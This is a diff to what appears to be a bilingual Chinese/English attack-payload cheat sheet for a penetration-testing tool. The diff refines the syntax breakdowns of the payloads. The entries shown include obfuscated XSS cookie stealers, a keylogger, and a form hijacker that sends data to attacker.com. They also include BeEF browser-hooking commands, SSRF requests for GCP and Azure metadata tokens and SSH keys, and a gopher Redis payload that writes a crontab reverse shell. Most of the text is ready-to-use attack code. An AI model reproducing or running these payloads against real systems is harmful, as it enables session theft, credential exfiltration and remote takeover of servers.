@@ -5912,9 +5896,9 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '混淆绕过', en: 'ObfuscationBypass' }, 
         command: '<script>var _0x1234="cookie";eval("new Image().src=\\"http://attacker.com/?c="+document[_0x1234]+"\\"")</script>',
             syntaxBreakdown: [
-              { part: '<script>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: 'var _0x1234="cookie";eval("new Image().src=\\"http://attacker.com/?c="+document[_0x1234]+"\\"")', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '</script>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' }
+              { part: 'var _0x1234="cookie"', explanation: { zh: '十六进制风格变量名混淆字符串"cookie"', en: 'Hex-style variable name obfuscates "cookie"' }, type: 'value' },
+              { part: 'eval("new Image().src=...")', explanation: { zh: 'eval执行字符串形式的外带语句', en: 'eval executes exfiltration string' }, type: 'function' },
+              { part: 'document[_0x1234]', explanation: { zh: '方括号语法动态取document.cookie，绕过点号检测', en: 'Bracket access evades dot notation detection' }, type: 'value' },
             ],
         description: { zh: '变量混淆绕过', en: 'VariableObfuscationBypass' }, 
         platform: 'all'
@@ -5952,9 +5936,10 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '2. 完整键盘记录', en: '2. completeKeylogging' }, 
         command: '<script>\nvar buffer = "";\ndocument.addEventListener("keydown", function(e){\n  if(e.key === "Enter"){\n    new Image().src = "http://attacker.com/log?data=" + encodeURIComponent(buffer);\n    buffer = "";\n  } else {\n    buffer += e.key;\n  }\n});\n</script>',
             syntaxBreakdown: [
-              { part: '<script>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '\nvar buffer = "";\ndocument.addEventListener("keydown", function(e){\n  if(e.key === "Enter"){\n    new Image().src = "http://attacker.com/log?data=" + encodeURIComponent(buffer);\n    buffer = "";\n  } else {\n    buffer += e.key;\n  }\n});\n', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '</script>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' }
+              { part: 'var buffer = "";', explanation: { zh: '初始化按键缓存变量', en: 'Initialize keystroke buffer' }, type: 'value' },
+              { part: 'document.addEventListener("keydown"', explanation: { zh: '注册keydown键盘监听', en: 'Register keydown listener' }, type: 'function' },
+              { part: 'buffer += e.key', explanation: { zh: '缓存每次按键字符', en: 'Buffer each pressed key' }, type: 'value' },
+              { part: 'new Image().src = "http://attacker.com/log?data=" + encodeURIComponent(buffer)', explanation: { zh: '按下回车时外带缓存的按键数据', en: 'Exfiltrate buffered keys on Enter' }, type: 'function' },
             ],
         description: { zh: '按Enter发送记录', en: 'Send log on Enter key' }, 
         platform: 'all'
@@ -5974,9 +5959,10 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '4. 表单提交劫持', en: '4. Form submission hijacking' }, 
         command: '<script>\ndocument.querySelectorAll("form").forEach(function(form){\n  form.addEventListener("submit", function(e){\n    var data = new FormData(this);\n    new Image().src = "http://attacker.com/log?" + new URLSearchParams(data).toString();\n  });\n});\n</script>',
             syntaxBreakdown: [
-              { part: '<script>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '\ndocument.querySelectorAll("form").forEach(function(form){\n  form.addEventListener("submit", function(e){\n    var data = new FormData(this);\n    new Image().src = "http://attacker.com/log?" + new URLSearchParams(data).toString();\n  });\n});\n', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '</script>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' }
+              { part: 'document.querySelectorAll("form")', explanation: { zh: '枚举页面全部表单', en: 'Enumerate all forms on the page' }, type: 'function' },
+              { part: 'form.addEventListener("submit"', explanation: { zh: '监听表单提交事件', en: 'Listen for form submissions' }, type: 'function' },
+              { part: 'new FormData(this)', explanation: { zh: '收集当前表单的全部字段值', en: 'Collect submitted field values' }, type: 'function' },
+              { part: 'new URLSearchParams(data).toString()', explanation: { zh: '序列化为查询字符串外带', en: 'Serialize and exfiltrate as query string' }, type: 'function' },
             ],
         description: { zh: '劫持表单提交', en: 'Hijack form submission' }, 
         },
@@ -5986,9 +5972,10 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '混淆版本', en: 'ObfuscationVersion' }, 
         command: '<script>var _0xa=["\\x6b\\x65\\x79\\x64\\x6f\\x77\\x6e","\\x61\\x64\\x64\\x45\\x76\\x65\\x6e\\x74\\x4c\\x69\\x73\\x74\\x65\\x6e\\x65\\x72"];document[_0xa[1]](_0xa[0],function(_0xb){new Image().src="http://attacker.com/?k="+_0xb[_0xa[0]]})</script>',
             syntaxBreakdown: [
-              { part: '<script>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: 'var _0xa=["\\x6b\\x65\\x79\\x64\\x6f\\x77\\x6e","\\x61\\x64\\x64\\x45\\x76\\x65\\x6e\\x74\\x4c\\x69\\x73\\x74\\x65\\x6e\\x65\\x72"];document[_0xa[1]](_0xa[0],function(_0xb){new Image().src="http://attacker.com/?k="+_0xb[_0xa[0]]})', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '</script>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' }
+              { part: '\\x6b\\x65\\x79\\x64\\x6f\\x77\\x6e', explanation: { zh: 'hex编码的"keydown"字符串', en: 'Hex-encoded "keydown" string' }, type: 'encoding' },
+              { part: '\\x61\\x64\\x64\\x45\\x76\\x65\\x6e\\x74\\x4c\\x69\\x73\\x74\\x65\\x6e\\x65\\x72', explanation: { zh: 'hex编码的"addEventListener"字符串', en: 'Hex-encoded "addEventListener" string' }, type: 'encoding' },
+              { part: 'document[_0xa[1]](_0xa[0],', explanation: { zh: '数组取值+方括号调用隐藏真实API', en: 'Bracket access hides real API' }, type: 'value' },
+              { part: 'new Image().src="http://attacker.com/?k="+_0xb[_0xa[0]]', explanation: { zh: '按键值经图片请求外带', en: 'Exfiltrate key via image request' }, type: 'function' },
             ],
         description: { zh: '十六进制混淆', en: 'hexadecimalObfuscation' }, 
         platform: 'all'
@@ -6015,7 +6002,12 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '1. 部署BeEF', en: '1. DeploymentBeEF' }, 
         command: '# 安装BeEF\ngit clone https://github.com/beefproject/beef\ncd beef\nbundle install\n./beef\n\n# 默认运行在 http://localhost:3000\n# 默认用户名: beef\n# 默认密码: beef',
             syntaxBreakdown: [
-              { part: '# 安装BeEF\ngit clone https://github.com/beefproject/beef\ncd beef\nbundle install', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: 'git clone https://github.com/beefproject/beef', explanation: { zh: '克隆BeEF官方源码', en: 'Clone BeEF source' }, type: 'command' },
+              { part: 'cd beef', explanation: { zh: '进入项目目录', en: 'Enter project directory' }, type: 'command' },
+              { part: 'bundle install', explanation: { zh: '安装Ruby依赖', en: 'Install Ruby dependencies' }, type: 'command' },
+              { part: './beef', explanation: { zh: '启动BeEF服务', en: 'Start BeEF' }, type: 'command' },
+              { part: 'http://localhost:3000', explanation: { zh: '默认监听地址与端口', en: 'Default listening address' }, type: 'domain' },
+              { part: 'beef/beef', explanation: { zh: '默认控制台账号与密码', en: 'Default console credentials' }, type: 'value' },
             ],
         description: { zh: '部署BeEF服务器', en: 'DeploymentBeEFServer' }, 
         platform: 'linux'
@@ -6034,7 +6026,10 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '3. 常用命令', en: '3. CommonCommand' }, 
         command: '# BeEF控制台常用命令\n# 查看在线僵尸\nbeef> online_browsers\n\n# 执行命令\nbeef> run social_engineering fake_notification\n\n# 获取Cookie\nbeef> run browser get_cookies\n\n# 重定向页面\nbeef> run browser redirect https://evil.com',
             syntaxBreakdown: [
-              { part: '# BeEF控制台常用命令\n# 查看在线僵尸\nbeef> online_browsers\n\n# 执行命令\nbeef> run social_engin', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: 'beef> online_browsers', explanation: { zh: '查看已上线的被控浏览器', en: 'List hooked browsers' }, type: 'command' },
+              { part: 'beef> run social_engineering fake_notification', explanation: { zh: '执行伪造系统通知的社工模块', en: 'Run fake notification module' }, type: 'command' },
+              { part: 'beef> run browser get_cookies', explanation: { zh: '获取被控浏览器Cookie', en: 'Retrieve hooked browser cookies' }, type: 'command' },
+              { part: 'beef> run browser redirect https://evil.com', explanation: { zh: '将被控页面重定向到恶意站点', en: 'Redirect hooked browser' }, type: 'command' },
             ],
         description: { zh: 'BeEF控制台命令', en: 'BeEF console command' }, 
         platform: 'all'
@@ -6043,9 +6038,9 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '4. 模块利用', en: '4. ModuleExploitation' }, 
         command: '# 常用模块\n# 社会工程学\n- Fake Notification\n- Fake Flash Update\n- Pretty Theft\n\n# 浏览器攻击\n- Get Cookie\n- Redirect Browser\n- TabNabbing\n\n# 网络攻击\n- DNS Spoofing\n- Ping Sweep\n- Port Scanner',
             syntaxBreakdown: [
-              { part: '# 常用模块\n# 社会工程学\n- Fake Notification\n- Fake Flash ', explanation: { zh: 'SQL表达式', en: 'SQLtableexpression' }, type: 'value' },
-              { part: 'Update', explanation: { zh: 'SQL关键字', en: 'SQLCriticalCharacter' }, type: 'keyword' },
-              { part: '\n- Pretty Theft\n\n# 浏览器攻击\n- Get Cookie\n- Redirect Browser\n- TabNabbing\n\n# 网络攻击\n- DNS Spoofing\n- Ping Sweep\n- Port Scanner', explanation: { zh: 'SQL表达式', en: 'SQLtableexpression' }, type: 'value' }
+              { part: '社会工程学', explanation: { zh: '模块分类：伪造通知/Flash升级/钓鱼窃取凭据', en: 'Category: fake notifications, updates, phishing' }, type: 'concept' },
+              { part: '浏览器攻击', explanation: { zh: '模块分类：取Cookie/重定向/标签页劫持', en: 'Category: cookies, redirect, tabnabbing' }, type: 'concept' },
+              { part: '网络攻击', explanation: { zh: '模块分类：DNS欺骗/Ping扫描/端口扫描', en: 'Category: DNS spoofing, ping sweep, port scan' }, type: 'concept' },
             ],
         description: { zh: 'BeEF模块列表', en: 'BeEFModulecolumntable' }, 
         },
@@ -6055,9 +6050,8 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '混淆Hook URL', en: 'ObfuscationHook URL' }, 
         command: '<script>eval(atob("dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7cy5zcmM9J2h0dHA6Ly9hdHRhY2tlci5jb206MzAwMC9ob29rLmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHMpOw=="))</script>',
             syntaxBreakdown: [
-              { part: '<script>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: 'eval(atob("dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7cy5zcmM9J2h0dHA6Ly9hdHRhY2tlci5jb206MzAwMC9ob29rLmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHMpOw=="))', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '</script>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' }
+              { part: 'eval(atob("dmFy..."))', explanation: { zh: 'eval配合atob解码执行Base64混淆代码', en: 'eval + atob decodes obfuscated payload' }, type: 'function' },
+              { part: 'dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7', explanation: { zh: 'Base64编码内容：动态创建script并加载hook.js', en: 'Base64 creating script loading hook.js' }, type: 'encoding' },
             ],
         description: { zh: 'Base64混淆Hook注入', en: 'Base64ObfuscationHookInjection' }, 
         platform: 'all'
@@ -6095,7 +6089,9 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '2. 获取访问令牌', en: '2. ObtainAccessToken' }, 
         command: 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\n返回OAuth访问令牌',
             syntaxBreakdown: [
-              { part: 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/def', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: '/default/email', explanation: { zh: '服务账号邮箱地址', en: 'Service account email' }, type: 'path' },
+              { part: '/default/aliases', explanation: { zh: '服务账号别名列表', en: 'Service account aliases' }, type: 'path' },
+              { part: 'metadata.google.internal', explanation: { zh: 'GCP元数据服务域名', en: 'GCP metadata service domain' }, type: 'domain' },
             ],
         description: { zh: '获取服务账户令牌', en: 'Get ServicesAccountToken' }, 
         platform: 'all'
@@ -6113,7 +6109,8 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '4. 获取项目信息', en: '4. Retrieve project information' }, 
         command: 'http://metadata.google.internal/computeMetadata/v1/project/project-id\nhttp://metadata.google.internal/computeMetadata/v1/project/numeric-project-id',
             syntaxBreakdown: [
-              { part: 'http://metadata.google.internal/computeMetadata/v1/project/project-id\nhttp://me', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: '/project/project-id', explanation: { zh: '项目字符串ID', en: 'Project string ID' }, type: 'path' },
+              { part: '/project/numeric-project-id', explanation: { zh: '项目数字ID', en: 'Project numeric ID' }, type: 'path' },
             ],
         description: { zh: '获取项目ID', en: 'Retrieve project ID' }, 
         platform: 'all'
@@ -6122,7 +6119,8 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '5. 获取SSH密钥', en: '5. ObtainSSHkey' }, 
         command: 'http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys\nhttp://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys',
             syntaxBreakdown: [
-              { part: 'http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys\n', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: '/project/attributes/ssh-keys', explanation: { zh: '项目级SSH公钥(含可登录用户名)', en: 'Project-level SSH public keys' }, type: 'path' },
+              { part: '/instance/attributes/ssh-keys', explanation: { zh: '实例级SSH公钥', en: 'Instance-level SSH public keys' }, type: 'path' },
             ],
         description: { zh: '获取SSH公钥', en: 'ObtainSSHpublic key' }, 
         platform: 'all'
@@ -6132,8 +6130,10 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         command: 'http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env\n获取Kubernetes环境变量',
         description: { zh: '获取GKE集群信息', en: 'ObtainGKEclusterInformation' }, 
         syntaxBreakdown: [
-          { part: 'http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env', explanation: { zh: '命令/关键字', en: 'Command/CriticalCharacter' }, type: 'command' }
-        ]
+          { part: 'metadata.google.internal', explanation: { zh: 'GCP元数据服务域名', en: 'GCP metadata service domain' }, type: 'domain' },
+          { part: '/instance/attributes/kube-env', explanation: { zh: '实例属性kube-env：K8s集群环境变量', en: 'kube-env attribute exposing cluster config' }, type: 'path' },
+          { part: '获取Kubernetes环境变量', explanation: { zh: '读取GKE集群配置信息', en: 'Read GKE cluster configuration' }, type: 'concept' },
+        ],
         },
       ],
     wafBypass: [
@@ -6141,7 +6141,9 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '使用IP地址', en: 'UseIPAddress' }, 
         command: 'http://169.254.169.254/computeMetadata/v1/\n使用内网IP代替域名',
             syntaxBreakdown: [
-              { part: 'http://169.254.169.254/computeMetadata/v1/\n使用内网IP代替域名', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: '169.254.169.254', explanation: { zh: '元数据服务链路本地地址，绕过域名黑名单时直接使用', en: 'Link-local metadata address' }, type: 'domain' },
+              { part: '/computeMetadata/v1/', explanation: { zh: 'GCP元数据API根路径', en: 'GCP metadata API root path' }, type: 'path' },
+              { part: '使用内网IP代替域名', explanation: { zh: '绕过针对metadata.google.internal域名的过滤', en: 'Bypass domain-based filtering' }, type: 'technique' },
             ],
         description: { zh: '绕过域名过滤', en: 'BypassDomain nameFilter' }, 
         platform: 'all'
@@ -6179,8 +6181,11 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '2. 获取访问令牌', en: '2. ObtainAccessToken' }, 
         command: 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/\n返回Azure AD访问令牌',
             syntaxBreakdown: [
-              { part: 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/\n返回Azure', explanation: { zh: '命令/载荷起始', en: 'Command/PayloadStart' }, type: 'command' },
-              { part: ' AD访问令牌', explanation: { zh: '参数与载荷内容', en: 'Parameter and PayloadContent' }, type: 'value' }
+              { part: '169.254.169.254', explanation: { zh: 'Azure IMDS元数据服务地址', en: 'Azure IMDS address' }, type: 'domain' },
+              { part: '/metadata/identity/oauth2/token', explanation: { zh: '托管标识的OAuth2令牌端点', en: 'Managed identity OAuth2 token endpoint' }, type: 'path' },
+              { part: 'api-version=2018-02-01', explanation: { zh: 'IMDS API版本参数', en: 'IMDS API version parameter' }, type: 'parameter' },
+              { part: 'resource=https://management.azure.com/', explanation: { zh: '请求针对Azure管理平面的令牌', en: 'Request token for Azure management plane' }, type: 'value' },
+              { part: '返回Azure AD访问令牌', explanation: { zh: '响应含Azure AD访问令牌', en: 'Response contains Azure AD token' }, type: 'concept' },
             ],
         description: { zh: '获取托管身份令牌', en: 'Retrieve managed identity token' }, 
         platform: 'all'
@@ -6189,7 +6194,9 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '3. 获取计算信息', en: '3. Retrieve compute information' }, 
         command: 'http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01\n返回VM详细信息',
             syntaxBreakdown: [
-              { part: 'http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01\n返回VM详细信', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: '/metadata/instance/compute', explanation: { zh: '实例计算信息端点', en: 'Instance compute info endpoint' }, type: 'path' },
+              { part: 'api-version=2021-02-01', explanation: { zh: 'IMDS API版本参数', en: 'IMDS API version parameter' }, type: 'parameter' },
+              { part: '返回VM详细信息', explanation: { zh: '响应含VM规格、名称等信息', en: 'Response contains VM details' }, type: 'concept' },
             ],
         description: { zh: '获取计算实例信息', en: 'Retrieve compute instance information' }, 
         platform: 'all'
@@ -6198,7 +6205,9 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '4. 获取网络信息', en: '4. ObtainNetwork Info' }, 
         command: 'http://169.254.169.254/metadata/instance/network?api-version=2021-02-01\n返回网络配置信息',
             syntaxBreakdown: [
-              { part: 'http://169.254.169.254/metadata/instance/network?api-version=2021-02-01\n返回网络配置信', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: '/metadata/instance/network', explanation: { zh: '实例网络配置端点', en: 'Instance network info endpoint' }, type: 'path' },
+              { part: 'api-version=2021-02-01', explanation: { zh: 'IMDS API版本参数', en: 'IMDS API version parameter' }, type: 'parameter' },
+              { part: '返回网络配置信息', explanation: { zh: '响应含内网IP、网卡等配置', en: 'Response contains network config' }, type: 'concept' },
             ],
         description: { zh: '获取网络配置', en: 'ObtainNetwork Configuration' }, 
         platform: 'all'
@@ -6207,7 +6216,8 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '5. 获取用户数据', en: '5. ObtainUsersData' }, 
         command: 'http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-02-01&format=text\n返回用户自定义数据',
             syntaxBreakdown: [
-              { part: 'http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-02-01', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: '/metadata/instance/compute/userData', explanation: { zh: '实例自定义数据端点，常含启动脚本与敏感配置', en: 'Instance userData endpoint' }, type: 'path' },
+              { part: 'format=text', explanation: { zh: '以纯文本返回内容', en: 'Return plain text format' }, type: 'parameter' },
             ],
         description: { zh: '获取用户数据', en: 'ObtainUsersData' }, 
         },
@@ -6277,7 +6287,10 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '4. LDAP协议', en: '4. LDAPProtocol' }, 
         command: 'ldap://attacker.com/cn=test\nldap://127.0.0.1:389/cn=test\n触发LDAP查询',
             syntaxBreakdown: [
-              { part: 'ldap://attacker.com/cn=test\nldap://127.0.0.1:389/cn=test\n触发LDAP查询', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: 'ldap://', explanation: { zh: 'LDAP协议scheme，触发服务端发起LDAP连接', en: 'LDAP protocol scheme' }, type: 'parameter' },
+              { part: 'attacker.com', explanation: { zh: '指向攻击者服务器验证外连', en: 'Attacker-controlled server' }, type: 'domain' },
+              { part: '127.0.0.1:389', explanation: { zh: '探测内网LDAP服务(默认端口389)', en: 'Probe internal LDAP on port 389' }, type: 'domain' },
+              { part: '/cn=test', explanation: { zh: '查询的条目DN', en: 'Queried entry DN' }, type: 'path' },
             ],
         description: { zh: '使用LDAP协议', en: 'UseLDAPProtocol' }, 
         platform: 'all'
@@ -6286,7 +6299,8 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '5. TFTP协议', en: '5. TFTPProtocol' }, 
         command: 'tftp://attacker.com/file\n触发TFTP请求',
             syntaxBreakdown: [
-              { part: 'tftp://attacker.com/file\n触发TFTP请求', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: 'tftp://', explanation: { zh: 'TFTP协议scheme', en: 'TFTP protocol scheme' }, type: 'parameter' },
+              { part: 'attacker.com/file', explanation: { zh: '从攻击者服务器请求文件', en: 'Request file from attacker server' }, type: 'domain' },
             ],
         description: { zh: '使用TFTP协议', en: 'UseTFTPProtocol' }, 
         },
@@ -6296,7 +6310,10 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '协议大小写绕过', en: 'Protocol case bypass' }, 
         command: 'FILE:///etc/passwd\nFile:///etc/passwd\nGopher://127.0.0.1:6379/',
             syntaxBreakdown: [
-              { part: 'FILE:///etc/passwd\nFile:///etc/passwd\nGopher://127.0.0.1:6379/', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: 'FILE://', explanation: { zh: 'file协议全大写变体', en: 'Uppercase file scheme variant' }, type: 'encoding' },
+              { part: 'File://', explanation: { zh: 'file协议首字母大写变体', en: 'Capitalized file scheme variant' }, type: 'encoding' },
+              { part: '/etc/passwd', explanation: { zh: 'Linux用户账户文件', en: 'Linux user account file' }, type: 'path' },
+              { part: 'Gopher://127.0.0.1:6379/', explanation: { zh: 'Gopher协议访问内网Redis端口', en: 'Gopher access to internal Redis' }, type: 'value' },
             ],
         description: { zh: '大小写混合绕过', en: 'Mixed-case bypass' }, 
         platform: 'all'
@@ -6334,7 +6351,12 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '2. 攻击Redis', en: '2. AttackRedis' }, 
         command: 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a',
             syntaxBreakdown: [
-              { part: 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: 'gopher://127.0.0.1:6379/_', explanation: { zh: 'Gopher协议构造发往内网Redis的原始请求流', en: 'Gopher carries raw Redis request stream' }, type: 'parameter' },
+              { part: 'flushall', explanation: { zh: 'Redis命令：清空全部键', en: 'Redis FLUSHALL command' }, type: 'command' },
+              { part: '*/1 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1', explanation: { zh: '写入的crontab值：每分钟反弹shell到4444端口', en: 'Crontab reverse shell payload' }, type: 'value' },
+              { part: '/var/spool/cron/', explanation: { zh: 'config set dir指向cron配置目录', en: 'RDB dump directory set to cron path' }, type: 'path' },
+              { part: 'root', explanation: { zh: 'dbfilename设为root对应用户的crontab文件', en: 'RDB filename set to root crontab' }, type: 'value' },
+              { part: 'save', explanation: { zh: '触发RDB落盘，把定时任务写入磁盘', en: 'SAVE triggers RDB persistence' }, type: 'command' },
             ],
         description: { zh: '写入cron任务反弹Shell', en: 'WritecrontaskReverse Shell' }, 
         platform: 'all'
@@ -6343,7 +6365,8 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '3. 攻击MySQL', en: '3. AttackMySQL' }, 
         command: 'gopher://127.0.0.1:3306/_<MySQL协议数据包>\n需要构造MySQL协议格式的数据',
             syntaxBreakdown: [
-              { part: 'gopher://127.0.0.1:3306/_<MySQL协议数据包>\n需要构造MySQL协议格式的数据', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: 'gopher://127.0.0.1:3306/_', explanation: { zh: 'Gopher协议打内网MySQL(3306端口)', en: 'Gopher targets internal MySQL' }, type: 'parameter' },
+              { part: '<MySQL协议数据包>', explanation: { zh: '需按MySQL协议格式手工构造的报文', en: 'Handcrafted MySQL protocol packet' }, type: 'value' },
             ],
         description: { zh: '攻击MySQL数据库', en: 'AttackMySQLDatabase' }, 
         platform: 'all'
@@ -6352,7 +6375,8 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '4. 攻击FastCGI', en: '4. AttackFastCGI' }, 
         command: 'gopher://127.0.0.1:9000/_<FastCGI数据包>\n构造PHP-FPM攻击载荷',
             syntaxBreakdown: [
-              { part: 'gopher://127.0.0.1:9000/_<FastCGI数据包>\n构造PHP-FPM攻击载荷', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: 'gopher://127.0.0.1:9000/_', explanation: { zh: 'Gopher协议打内网PHP-FPM(9000端口)', en: 'Gopher targets internal PHP-FPM' }, type: 'parameter' },
+              { part: '<FastCGI数据包>', explanation: { zh: '构造的FastCGI协议报文', en: 'Crafted FastCGI packet' }, type: 'value' },
             ],
         description: { zh: '攻击PHP-FPM', en: 'AttackPHP-FPM' }, 
         platform: 'all'
@@ -6361,7 +6385,9 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '5. 发送HTTP请求', en: '5. SendHTTPRequest' }, 
         command: 'gopher://target.com:80/_GET%20/admin%20HTTP/1.1%0d%0aHost:%20target.com%0d%0a%0d%0a\n构造HTTP请求攻击内网',
             syntaxBreakdown: [
-              { part: 'gopher://target.com:80/_GET%20/admin%20HTTP/1.1%0d%0aHost:%20target.com%0d%0a%0d', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: 'gopher://target.com:80/_', explanation: { zh: 'Gopher协议构造内网HTTP请求', en: 'Gopher crafts internal HTTP request' }, type: 'parameter' },
+              { part: 'GET%20/admin%20HTTP/1.1', explanation: { zh: 'URL编码的GET /admin请求行', en: 'Encoded GET request line' }, type: 'encoding' },
+              { part: 'Host:%20target.com', explanation: { zh: 'URL编码的Host请求头', en: 'Encoded Host header' }, type: 'header' },
             ],
         description: { zh: '发送HTTP请求', en: 'SendHTTPRequest' }, 
         },
@@ -6371,7 +6397,9 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '双重URL编码', en: 'DoubleURL Encoding' }, 
         command: 'gopher://127.0.0.1:6379/_%252a%250d%250a...\n双重编码绕过',
             syntaxBreakdown: [
-              { part: 'gopher://127.0.0.1:6379/_%252a%250d%250a...\n双重编码绕过', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: 'gopher://127.0.0.1:6379/_', explanation: { zh: 'Gopher载荷发往内网Redis', en: 'Gopher payload to internal Redis' }, type: 'parameter' },
